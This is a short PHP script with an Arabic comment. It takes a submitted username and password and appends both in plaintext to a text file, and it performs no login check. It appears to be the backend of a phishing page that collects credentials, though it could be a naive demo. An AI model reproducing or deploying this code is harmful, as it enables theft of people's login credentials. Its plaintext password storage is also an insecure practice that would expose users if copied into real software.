<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // تخزين البيانات المدخلة في ملف نصي
    $file = fopen("userdata.txt", "a");
    fwrite($file, "Username: $username\nPassword: $password\n\n");
    fclose($file);

    echo "Information has been saved successfully!";
}
?>

